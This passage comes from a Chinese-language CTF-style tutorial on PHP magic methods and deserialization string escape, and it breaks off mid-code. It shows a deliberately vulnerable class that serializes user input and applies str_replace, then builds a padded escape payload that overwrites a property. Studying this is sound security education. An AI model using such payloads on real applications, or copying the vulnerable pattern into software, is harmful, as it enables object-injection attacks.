punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"-----------分隔符--------------&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现私有属性时会调用issset魔术方法(调用protect的属性也会调用)<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545860.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"unset\"><a href=\"#unset\" class=\"headerlink\" title=\"__unset()\"></a>__unset()</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> ：在不可访问的属性上使用 <span class=\"token keyword\">unset</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 时触发<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>实例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"当使用unset()函数，自动调用&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"quan9i will be the best\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// public 成员</span>\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// private 成员</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"-----------分隔符--------------&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545820.png\" alt=\"在这里插入图片描述\"></p>\n<p>可以发现当对一个公有属性进行unset的时候，会删除它，而私有变量则会调用unset函数</p>\n<h2 id=\"常用魔术函数汇总例子\"><a href=\"#常用魔术函数汇总例子\" class=\"headerlink\" title=\"常用魔术函数汇总例子\"></a>常用魔术函数汇总例子</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">public</span> <span class=\"token variable\">$varr1</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"abc\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">public</span> <span class=\"token variable\">$varr2</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"123\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">echoP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">varr1</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__construct&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__destruct&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"__toString&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__sleep&lt;br>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'varr1'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'varr2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__wakeup&lt;br>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//实例化对象，调用__construct()方法，输出__construct</span>\n<span class=\"token variable\">$obj</span><span class=\"token operator\">-></span><span class=\"token function\">echoP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//调用echoP()方法，输出\"abc\"</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span>\n<span class=\"token variable\">$s</span> <span class=\"token operator\">=</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//obj对象被序列化，调用__sleep()方法，输出__sleep</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//sleep返回的信息此时被输出</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。后面这个是一个对象，因此会执行一次__destruct方法</span>\n<span class=\"token comment\">// 结束又会调用__destruct()方法，输出__destruct</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545033.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"常考类型\"><a href=\"#常考类型\" class=\"headerlink\" title=\"常考类型\"></a>常考类型</h1><h2 id=\"反序列化字符串逃逸\"><a href=\"#反序列化字符串逃逸\" class=\"headerlink\" title=\"反序列化字符串逃逸\"></a>反序列化字符串逃逸</h2><p>首先来介绍一下这个<code>str_replace</code>函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">str_replace \nstr_replace — 子字符串替换\n说明 \n<span class=\"token keyword type-declaration\">mixed</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">mixed</span> <span class=\"token variable\">$search</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">mixed</span> <span class=\"token variable\">$replace</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">mixed</span> <span class=\"token variable\">$subject</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$count</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。 \n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>而后看如下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$umsg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$umsg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your message has been sent'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话也就是序列化后的msg变量中的fuck会被loveU替换<br>这里涉及到一个知识点，就是<code>反序列化字符逃逸</code>，首先对这个知识点进行讲解<br>它其实就是在遇到替换函数时，加上修改的语句，同时构造出正确的序列化文本，使其能够正常进行反序列化，就达到了字符逃逸目的，具体文章可以参考Y4大师傅的<a href=\"https://blog.csdn.net/solitudi/article/details/109043560?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165502786716781432968408%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165502786716781432968408&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109043560-null-null.nonecase&utm_term=%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8&spm=1018.2226.3001.4450\">这篇文章</a><br>我再以例子为讲解<br>比如说</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$quan9i</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>首先我们给它来个简单的赋值</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时它的输出结果为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"message\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"from\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"x\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"y\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"to\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"z\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这时候我们使用替换函数<code>str_replace</code>再来尝试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'qq'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>此时我们看一下结果</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"message\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"from\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"qq\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"y\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"to\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"z\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时你就会发现<code>s:1:&quot;qq&quot;;</code>里面说只有1个字符，但是存在qq两个字符，这时候就存在了字串符逃逸。我们这里就假设quan9i为1的时候可以获取flag，我们该如何做呢？<br>将后面的添加到x的后面，即<code>&quot;;s:3:&quot;msg&quot;;s:1:&quot;y&quot;;s:2:&quot;to&quot;;s:1:&quot;z&quot;;s:6:&quot;quan9i&quot;;s:1:&quot;0&quot;;&#125;</code>这部分，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><code>&quot;;s:3:&quot;msg&quot;;s:1:&quot;y&quot;;s:2:&quot;to&quot;;s:1:&quot;z&quot;;s:6:&quot;quan9i&quot;;s:1:&quot;1&quot;;&#125;</code>这部分是59个字符，那我们此时添加58个x<br>，构造出59个x，与后面字符保持一致，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时我们输出一下它</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'qq'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span 